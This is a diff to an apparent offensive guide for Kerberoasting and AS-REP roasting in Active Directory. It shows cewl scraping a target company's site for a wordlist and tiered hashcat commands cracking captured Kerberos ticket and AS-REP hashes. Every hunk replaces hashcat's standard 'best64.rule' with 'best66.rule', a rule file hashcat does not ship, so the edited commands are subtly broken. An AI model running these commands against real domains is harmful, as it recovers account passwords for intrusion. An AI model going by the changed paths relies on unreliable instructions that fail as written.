@@ -87,7 +87,7 @@ cewl -d 2 -w /tmp/kroast/company.txt https://$PUBLIC_SITE 2>/dev/null || true
 # Hashcat with rules
 hashcat -m 18200 /tmp/kroast/asrep.hash \
   /tmp/kroast/company.txt /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule \
+  -r /usr/share/hashcat/rules/best66.rule \
   --force --potfile-path /tmp/kroast/hc.pot
 
 # Show what cracked
@@ -166,7 +166,7 @@ Note: this works only when the target account allows RC4 (`msDS-SupportedEncrypt
 ```bash
 hashcat -m 13100 /tmp/kroast/kerberoast.hash \
   /tmp/kroast/company.txt /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule \
+  -r /usr/share/hashcat/rules/best66.rule \
   --force --potfile-path /tmp/kroast/hc.pot
 
 hashcat -m 13100 /tmp/kroast/kerberoast.hash --show \
@@ -232,16 +232,16 @@ bhgraph asreproastable
 A tiered approach yields the fastest wins:
 
 ```bash
-# Tier 1: target-specific wordlist (cewl) + best64 rules
+# Tier 1: target-specific wordlist (cewl) + best66 rules
 hashcat -m 13100 /tmp/kroast/kerberoast.hash \
   /tmp/kroast/company.txt \
-  -r /usr/share/hashcat/rules/best64.rule \
+  -r /usr/share/hashcat/rules/best66.rule \
   --potfile-path /tmp/kroast/hc.pot
 
-# Tier 2: rockyou + best64
+# Tier 2: rockyou + best66
 hashcat -m 13100 /tmp/kroast/kerberoast.hash \
   /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule \
+  -r /usr/share/hashcat/rules/best66.rule \
   --potfile-path /tmp/kroast/hc.pot
 
 # Tier 3: rockyou + dive (most aggressive default rule)
